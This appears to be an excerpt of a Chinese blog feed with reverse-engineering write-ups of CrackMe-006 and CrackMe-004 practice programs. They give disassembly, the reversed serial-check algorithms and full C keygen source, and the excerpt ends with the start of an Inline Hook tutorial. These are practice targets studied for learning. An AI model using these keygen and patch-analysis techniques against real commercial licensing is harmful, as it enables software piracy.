class="hljs-attribute">00442DDC</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8910</span>       mov dword ptr fs:[eax],edx<br><span class="hljs-attribute">00442DDF</span>  |.  <span class="hljs-number">68</span> F<span class="hljs-number">42</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DF<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DE4</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> FC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DE7</span>  |.  E<span class="hljs-number">8</span> CC<span class="hljs-number">09</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442DEC</span>  \.  C<span class="hljs-number">3</span>            retn<br></code></pre></div></td></tr></table></figure><p>进入算法进行查看，可以看到一个通过注册码求用户名的过程。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442C09</span>  |.  <span class="hljs-number">0</span>FB<span class="hljs-number">64430</span> FF   |movzx eax,byte ptr ds:[eax+esi-<span class="hljs-number">0</span>x<span class="hljs-number">1</span>]     ;  获取最后一位<br><span class="hljs-attribute">00442C0E</span>  |.  F<span class="hljs-number">7</span>E<span class="hljs-number">8</span>          |imul eax                                ;  平方<br><span class="hljs-attribute">00442C10</span>  |.  <span class="hljs-number">0</span>FBFC<span class="hljs-number">0</span>        |movsx eax,ax<br><span class="hljs-attribute">00442C13</span>  |.  F<span class="hljs-number">7</span>EE          |imul esi                                ;  乘以长度/长度不断-<span class="hljs-number">1</span><br><span class="hljs-attribute">00442C15</span>  |.  B<span class="hljs-number">9</span> <span class="hljs-number">19000000</span>   |mov ecx,<span class="hljs-number">0</span>x<span class="hljs-number">19</span><br><span class="hljs-attribute">00442C1A</span>  |.  <span class="hljs-number">99</span>            |cdq<br><span class="hljs-attribute">00442C1B</span>  |.  F<span class="hljs-number">7</span>F<span class="hljs-number">9</span>          |idiv ecx<br><span class="hljs-attribute">00442C1D</span>  |.  <span class="hljs-number">83</span>C<span class="hljs-number">2</span> <span class="hljs-number">41</span>       |add edx,<span class="hljs-number">0</span>x<span class="hljs-number">41</span>                            ;  除以<span class="hljs-number">0</span>x<span class="hljs-number">19</span>余数+<span class="hljs-number">0</span>x<span class="hljs-number">41</span><br><span class="hljs-attribute">00442C20</span>  |.  <span class="hljs-number">58</span>            |pop eax                                 ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442C21</span>  |.  <span class="hljs-number">8810</span>          |mov byte ptr ds:[eax],dl<br><span class="hljs-attribute">00442C23</span>  |.  <span class="hljs-number">4</span>E            |dec esi<br><span class="hljs-attribute">00442C24</span>  |.  <span class="hljs-number">85</span>F<span class="hljs-number">6</span>          |test esi,esi<br><span class="hljs-attribute">00442C26</span>  |.^ <span class="hljs-number">75</span> D<span class="hljs-number">1</span>         \jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>BF<span class="hljs-number">9</span><br><span class="hljs-attribute">00442C28</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">4</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442C2B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> FC       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442C2E</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">110</span>FFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00403</span>B<span class="hljs-number">44</span>                   ;  与输入的用户名进行比较<br><span class="hljs-attribute">00442C33</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">17</span>         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>C<span class="hljs-number">4</span>C<br></code></pre></div></td></tr></table></figure><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>itoa(serial, name,<span class="hljs-number">10</span>);<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">int</span> a = len;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><span class="hljs-keyword">int</span> temp = name[a<span class="hljs-number">-1</span>] * name[a<span class="hljs-number">-1</span>];<br>temp = temp *  a;<br>temp = temp % <span class="hljs-number">0x19</span>;<br>temp = temp + <span class="hljs-number">0x41</span>;<br>name[a - <span class="hljs-number">1</span>] = temp;<br>a = a -  <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, name);<br></code></pre></div></td></tr></table></figure><p>现在就剩下最后一个事件，CancellaClick</p><p>进去查看，发现里面没有那个熟悉的地址，那么基本上那个地址的赋值应该就是在这里了吧，只有一个跳转，修改条件后，最早下的硬件断点终于断下来了。那么查看一下算法的过程。</p><p><img src="/2021/08/02/160CrackMe-006/8.png"></p><p>进入函数查看，可以看到具体的算法，是一个通过用户名求注册码的过程。</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">00442B20</span>  |.  83F8 <span class="hljs-number">05</span>       cmp eax,<span class="hljs-number">0x5</span>                              ;  判断输入的name是否大于<span class="hljs-number">5</span><br><span class="hljs-number">00442B23</span>  |.  7E <span class="hljs-number">53</span>         jle short aLoNg3x_<span class="hljs-number">.00442B78</span><br><span class="hljs-number">00442B25</span>  |.  <span class="hljs-number">8B45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442B28</span>  |.  <span class="hljs-number">0FB640</span> <span class="hljs-number">04</span>     movzx eax,byte ptr ds:[eax+<span class="hljs-number">0x4</span>]          ;  获取name第五位<br><span class="hljs-number">00442B2C</span>  |.  B9 <span class="hljs-number">07000000</span>   mov ecx,<span class="hljs-number">0x7</span><br><span class="hljs-number">00442B31</span>  |.  33D2          xor edx,edx<br><span class="hljs-number">00442B33</span>  |.  F7F1          div ecx                                  ;  除以<span class="hljs-number">7</span><br><span class="hljs-number">00442B35</span>  |.  8BC2          mov eax,edx                              ;  余数<br><span class="hljs-number">00442B37</span>  |.  83C0 <span class="hljs-number">02</span>       add eax,<span class="hljs-number">0x2</span><br><span class="hljs-number">00442B3A</span>  |.  E8 E1FEFFFF   call aLoNg3x_.<span class="hljs-number">00442A20</span>                   ;  阶乘<br><span class="hljs-number">00442B3F</span>  |.  8BF0          mov esi,eax<br><span class="hljs-number">00442B41</span>  |.  33DB          xor ebx,ebx<br><span class="hljs-number">00442B43</span>  |.  <span class="hljs-number">8B45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442B46</span>  |.  E8 E90EFCFF   call aLoNg3x_.<span class="hljs-number">00403A34</span><br><span class="hljs-number">00442B4B</span>  |.  85C0          test eax,eax<br><span class="hljs-number">00442B4D</span>  |.  7E <span class="hljs-number">16</span>         jle short aLoNg3x_<span class="hljs-number">.00442B65</span><br><span class="hljs-number">00442B4F</span>  |.  BA <span class="hljs-number">01000000</span>   mov edx,<span class="hljs-number">0x1</span><br><span class="hljs-number">00442B54</span>  |&gt;  8B4D FC       /mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442B57</span>  |.  <span class="hljs-number">0FB64C11</span> FF   |movzx ecx,byte ptr ds:[ecx+edx-<span class="hljs-number">0x1</span>]     ;  逐位获取<br><span class="hljs-number">00442B5C</span>  |.  <span class="hljs-number">0FAFCE</span>        |imul ecx,esi<br><span class="hljs-number">00442B5F</span>  |.  <span class="hljs-number">03D9</span>          |add ebx,ecx                             ;  user32.75B16D51<br><span class="hljs-number">00442B61</span>  |.  <span class="hljs-number">42</span>            |inc edx<br><span class="hljs-number">00442B62</span>  |.  <span class="hljs-number">48</span>            |dec eax<br><span class="hljs-number">00442B63</span>  |.^ <span class="hljs-number">75</span> EF         \jnz short aLoNg3x_<span class="hljs-number">.00442B54</span><br><span class="hljs-number">00442B65</span>  |&gt;  2B5D F8       sub ebx,dword ptr ss:[ebp-<span class="hljs-number">0x8</span>]           ;  减去注册码十六进制<br><span class="hljs-number">00442B68</span>  |.  81FB 697A0000 cmp ebx,<span class="hljs-number">0x7A69</span><br><span class="hljs-number">00442B6E</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">04</span>         jnz short aLoNg3x_<span class="hljs-number">.00442B74</span><br><span class="hljs-number">00442B70</span>  |.  B3 <span class="hljs-number">01</span>         mov bl,<span class="hljs-number">0x1</span>                               ;  关键的赋值<br><span class="hljs-number">00442B72</span>  |.  EB <span class="hljs-number">06</span>         jmp short aLoNg3x_.<span class="hljs-number">00442B7A</span><br><span class="hljs-number">00442B74</span>  |&gt;  33DB          xor ebx,ebx<br><span class="hljs-number">00442B76</span>  |.  EB <span class="hljs-number">02</span>         jmp short aLoNg3x_.<span class="hljs-number">00442B7A</span><br></code></pre></div></td></tr></table></figure><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> a = szname[<span class="hljs-number">4</span>] % <span class="hljs-number">0x7</span>;<br>a = a + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">int</span> num = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= a; i++) &#123;<br>num = num * i;<br>&#125;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>sum += szname[i] * num;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x7A69</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br><span class="hljs-keyword">return</span> serial;<br></code></pre></div></td></tr></table></figure><p>当经过了这个判断之后，那个地址就会被赋值，同时cancle按钮也会消失，ok按钮会常亮。</p><p><img src="/2021/08/02/160CrackMe-006/9.png"></p><p>那么整体的流程就很清楚，首先要通过用户名计算一个注册码输入cancle按钮消失，ok变亮，然后再通过注册码计算出一个用户名输入后，ok消失，完成注册</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>完整注册机代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">CancleClick</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szname)</span> </span>&#123;<br><span class="hljs-keyword">int</span> a = szname[<span class="hljs-number">4</span>] % <span class="hljs-number">0x7</span>;<br>a = a + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">int</span> num = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= a; i++) &#123;<br>num = num * i;<br>&#125;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>sum += szname[i] * num;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x7A69</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br><span class="hljs-keyword">return</span> serial;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CodiceChange</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szname)</span> </span>&#123;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = len;<br><span class="hljs-keyword">int</span> temp = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>sum = ((szname[i] * szname[i + <span class="hljs-number">1</span>]) * temp) + sum;<br>temp++;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x29A</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OkClick</span><span class="hljs-params">(<span class="hljs-keyword">int</span> serial)</span> </span>&#123;<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>itoa(serial, name,<span class="hljs-number">10</span>);<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">int</span> a = len;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><span class="hljs-keyword">int</span> temp = name[a<span class="hljs-number">-1</span>] * name[a<span class="hljs-number">-1</span>];<br>temp = temp *  a;<br>temp = temp % <span class="hljs-number">0x19</span>;<br>temp = temp + <span class="hljs-number">0x41</span>;<br>name[a - <span class="hljs-number">1</span>] = temp;<br>a = a -  <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, name);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;让cancle消失，通过用户名求出的serial\n&quot;</span>);<br><span class="hljs-keyword">int</span> serial = CancleClick(name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;仅仅只是显示OK按钮\n&quot;</span>);<br>CodiceChange(name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;让OK消失，通过serial：%d\n求出的用户名\n&quot;</span>,serial);<br>OkClick(serial);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/02/160CrackMe-006/10.png"></p><p>cancle按钮</p><p><img src="/2021/08/02/160CrackMe-006/11.png"></p><p>OK按钮</p><p><img src="/2021/08/02/160CrackMe-006/12.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>程序共有三个算法</p><ul><li>nomechange和codicechange里的，仅仅只是让OK亮起来</li><li>cancleClick里的，消失cancle按钮，赋值给那个关键地方，OK亮起</li><li>OKClick里的，让OK按钮消失</li></ul><p>不知道nomechange和codicechange里的算法有什么用，感觉没必要。。。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-004</title>
    <link href="/2021/07/29/160CrackMe-004/"/>
    <url>/2021/07/29/160CrackMe-004/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序，看到需要输入用户名和注册码，提示如果正确下面会出现一张朱茵的照片。</p><p><img src="/2021/07/29/160CrackMe-004/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>使用DIE查看一下，无壳，使用Delphi编写的。</p><p><img src="/2021/07/29/160CrackMe-004/2.png"></p><p>使用OD搜索一下字符串，可以看到几个字符串，其中有恭喜注册成功的字样，可以看到还有黑头这样的问题，但是点进去查看没有什么。</p><p><img src="/2021/07/29/160CrackMe-004/3.png"></p><p>下断点在恭喜这里，但是看不到什么有用的信息，在获取用户名的长度，然后加上循环次数这样，但是这并不是注册码，然后跳转的关键在esi+0x30c这里，如果这里的值不等于0x85就会跳转到失败。</p><p><img src="/2021/07/29/160CrackMe-004/4.png"></p><p>此时想到刚才的黑头这样的字样，在程序中出现这样的感觉多少会和注册码有点关系。</p><p>那个地方只有在程序运行的时候才会到达，当跑起来下断是不会断下来的，那里如果出现这样的字眼，并且调用的都是同一个函数，那么有没有可能就是把字符串存在内存里，找到地方下一个断点看看，如果注册码确实用到的话肯定会调用。</p><p>根据字符串找到地方跟一下，发现这里有一个地方向一个地址写入了这些字符串，在这里下一个硬件访问断点看看。</p><p><img src="/2021/07/29/160CrackMe-004/5.png"></p><p>下断点之后，刚输入注册码就断下来在一个地方，跑几步，看到寄存器有一个值，这很像注册码。</p><p><img src="/2021/07/29/160CrackMe-004/6.png"></p><p>大致分析看一下，可以看到在这里有一个向esi+0x30c写入3c的地方，这里有一个JNZ决定是否执行，那么这里应该是一个很关键的地方</p><p><img src="/2021/07/29/160CrackMe-004/7.png"></p><p>看这里，在前面进行了一个比较，然后决定是否跳转。12345是我们输入的注册码</p><p>而黑头Sun Bird12dseloffc-012-OKb1ackie这个是生成的，可以看到b1ackie是用户名目前只有中间这个12不知道是如何生成的，继续分析一下。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00457D2C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> E<span class="hljs-number">0</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">20</span>]                  ;  输入的注册码<br><span class="hljs-attribute">00457D2F</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">93</span> <span class="hljs-number">18030000</span> mov edx,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">318</span>]                 ;  生成的<br><span class="hljs-attribute">00457D35</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">52</span>BFFAFF   call CKme.<span class="hljs-number">00403</span>C<span class="hljs-number">8</span>C<br><span class="hljs-attribute">00457D3A</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">0</span>A         jnz short CKme.<span class="hljs-number">00457</span>D<span class="hljs-number">46</span><br><span class="hljs-attribute">00457D3C</span>  |.  C<span class="hljs-number">783</span> <span class="hljs-number">0</span>C<span class="hljs-number">030000</span>&gt;mov dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">30</span>C],<span class="hljs-number">0</span>x<span class="hljs-number">3</span>E<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/29/160CrackMe-004/8.png"></p><p>这个数字是在前面生成的，是根据输入用户名的长度加上0x5生成的。ebx+0x2F8中是长度，可以通过同样的下断点方法去分析这里的值。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00457C66</span>  |.  <span class="hljs-number">8</span>BB<span class="hljs-number">3</span> F<span class="hljs-number">8020000</span> mov esi,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>F<span class="hljs-number">8</span>]                 ;  用户名长度<br><span class="hljs-attribute">00457C6C</span>  |.  <span class="hljs-number">83</span>C<span class="hljs-number">6</span> <span class="hljs-number">05</span>       add esi,<span class="hljs-number">0</span>x<span class="hljs-number">5</span>                                      ;  加上<span class="hljs-number">0</span>x<span class="hljs-number">5</span><br><span class="hljs-attribute">00457C6F</span>  |.  FFB<span class="hljs-number">3</span> <span class="hljs-number">10030000</span> push dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">310</span>]<br><span class="hljs-attribute">00457C75</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00457C78</span>  |.  <span class="hljs-number">8</span>BC<span class="hljs-number">6</span>          mov eax,esi<br><span class="hljs-attribute">00457C7A</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">85</span>FEFAFF   call CKme.<span class="hljs-number">00407</span>B<span class="hljs-number">04</span>                               ;  转字符串（<span class="hljs-number">10</span>进制）<br></code></pre></div></td></tr></table></figure><p>这里只要相等就会给关键地址赋值0x3E，但是并不是0x85，继续在这里下断点看一下什么情况。（此时输入黑头Sun Bird12dseloffc-012-OKb1ackie就可以注册成功，不过点击一次是不行的，要连续点击好几次才行）</p><p>但是每次点击都会断在恭喜的那个JNZ那里，可以发现值并没有被改变，还是3E，是我断点的问题，不要下访问断点，改成写入断点，看看在哪里可以写入85。</p><p><img src="/2021/07/29/160CrackMe-004/9.png"></p><p>然后疯狂点击图片，就会断下来，可以看到这里先判断是否等于0x3E然后再赋值0x85。</p><p><img src="/2021/07/29/160CrackMe-004/10.png"></p><p>什么情况才会到这里，其实就是双击会到这里，而普通的点击就是刚开始0x85比较那里，还是借助Dedark工具可以看的更仔细，可以看到事件，用这个工具可以很方便的定位到刚才的几个地方而不需要借助硬件断点，很方便。</p><p><img src="/2021/07/29/160CrackMe-004/12.png"></p><p>那么现在整个流程就清楚了，需要输入正确的注册码之后，先双击再点击就可以成功注册。</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>注册码很简单，获取用户名的长度，然后加上5，放在黑头Sun Bird和dseloffc-012-OK中间，最后再加上用户名即可。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name：\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br>len += <span class="hljs-number">5</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注册码：\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;黑头Sun Bird%ddseloffc-012-OK%s&quot;</span>, len, name);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/29/160CrackMe-004/13.png"></p><p><img src="/2021/07/29/160CrackMe-004/11.png"></p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HOOK-Inline Hook</title>
    <link href="/2021/07/28/HOOK-Inline%20Hook/"/>
    <url>/2021/07/28/HOOK-Inline%20Hook/</url>
    
    <content type="html"><![CDATA[<h4 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h4><p>Inline Hook是Hook技术的一种，它是通过修改机器码来实现HOOK。当我们正常调用一个API函数时，正常的流程是，call API，然后就会到函数内部执行。我们写下如下语句，在OD中打开就是如图的样子。可以看到先压入参数，然后调用MessageBoxA函数。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;这是本来的窗口&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/28/HOOK-Inline%20Hook/1.png"></p><p>进入函数可以看到函数的具体</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/2.png"></p><p>Inline Hook就是了通过字节码更改了函数的流程，刚才我们看到的是正常的流程，如果调用正常函数的时候，我们修改它的执行流程，使其跳转到我们自定义的函数内部去执行就可以实现Inlie HOOK。</p><h4 id="如何实现"><a href="#如何实现" class="headerlink" 